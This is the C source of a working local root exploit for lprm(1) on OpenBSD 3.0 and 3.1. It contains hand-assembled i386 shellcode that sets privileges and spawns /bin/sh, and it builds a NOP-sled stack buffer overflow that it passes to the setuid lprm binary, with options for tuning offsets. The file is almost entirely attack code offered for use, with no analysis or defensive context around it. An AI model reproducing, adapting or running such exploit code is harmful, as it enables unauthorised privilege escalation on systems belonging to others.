/*
 * lprmexp.c
 *
 * OpenBSD <= 3.1 lprm(1) local root exploit
 *
 * By CMN <cmn@darklab.org>/<md0claes@mdstud.chalmers.se>
 *
 * Tested on OpenBSD 3.0 and 3.1.
 *
 * Fiddle with -a option from 1 to 7 to indent address in
 * buffer.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>

#define LPRMPROG    "/usr/bin/lprm"
#define BUFSIZE     511
#define OFFSET      0
#define NOP         0x90

static char obsdcode[] =
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\x50"                 /* pushl   %eax        */
    "\x50"                 /* pushl   %eax        */
    "\xb0\xb7"             /* movb    $0xb7, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\xb0\x19"             /* movb    $0x19, %al  */
    "\x50"                 /* pushl   %eax        */
    "\xcd\x80"             /* int     $0x80       */
    "\x50"                 /* pushl   %eax        */
    "\x50"                 /* pushl   %eax        */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\xb0\x17"             /* movb    $0x17, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\xb0\x2b"             /* movb    $0x2b, %al  */
    "\x50"                 /* pushl   %eax        */
    "\xcd\x80"             /* int     $0x80       */
    "\x50"                 /* pushl   %eax        */
    "\x50"                 /* pushl   %eax        */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\xb0\xb5"             /* movb    $0xb5, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\x50"                 /* pushl   %eax        */
    "\x68\x2f\x2f\x73\x68" /* pushl   $0x68732f2f */
    "\x68\x2f\x62\x69\x6e" /* pushl   $0x6e69622f */
    "\x89\xe3"             /* movl    %esp, %ebx  */
    "\x50"                 /* pushl   %eax        */
    "\x53"                 /* pushl   %ebx        */
    "\x89\xe2"             /* movl    %esp, %edx  */
    "\x50"                 /* pushl   %eax        */
    "\x52"                 /* pushl   %edx        */
    "\x53"                 /* pushl   %ebx        */
    "\x50"                 /* pushl   %eax        */
    "\xb0\x3b"             /* movb    $0x3b, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\x40"                 /* inc     %eax        */
    "\x50"                 /* pushl   %eax        */
    "\x50"                 /* pushl   %eax        */
    "\xcd\x80";            /* int     $0x80       */

u_long
getesp(void)
{
    __asm__("movl %esp, %eax");
}

void
usage(u_char *pname)
{
    printf("\n** OpenBSD lprm(1) local root exploit by CMN **\n");
    printf("\nUsage: %s printer [-o offs] [-r ret] [-a indent]\n\n",
        pname);
}


int
main(int argc, char *argv[])
{
    int i;
    u_char indent = 0;
    u_long raddr = 0;
    u_long offset = 0;
    u_char buf[BUFSIZE+1];

    if (argc < 2) {
        usage(argv[0]);
        exit(1);
    }

    argc--;
    argv++;

    while ( (i = getopt(argc, argv, "a:r:o:")) != -1) {
        switch (i) {
            case 'a':
                indent = atoi(optarg) % 8;
                break;

            case 'r':
                raddr = strtoul(optarg, NULL, 0);
                break;

            case 'o':
                offset = strtoul(optarg, NULL, 0);
                break;

            default:
                exit(1);
                break;
        }
    }

    if (!raddr) {
        raddr = getesp();
        raddr -= offset ? offset : OFFSET;
    }
    else
        raddr -= offset;

    printf("Using address 0x%08x\n", raddr);

    memset(buf, NOP, BUFSIZE);
    memcpy(&buf[BUFSIZE-(indent+4)], &raddr, sizeof(raddr));
    memcpy(&buf[BUFSIZE-(indent+8)], &raddr, sizeof(raddr));
    memcpy(&buf[BUFSIZE-(indent+12)], &raddr, sizeof(raddr));
    memcpy(&buf[BUFSIZE-(indent+16)], &raddr, sizeof(raddr));
    memcpy(&buf[BUFSIZE-(indent+20)], &raddr, sizeof(raddr));
    memcpy(&buf[BUFSIZE-(indent+24)], &raddr, sizeof(raddr));
    memcpy(&buf[BUFSIZE]-(strlen(obsdcode)+100),
            obsdcode, strlen(obsdcode));
    buf[BUFSIZE] = '\0';

    execlp(LPRMPROG, "CMN", "-P", argv[0], buf, buf, NULL);
    exit(1);
}
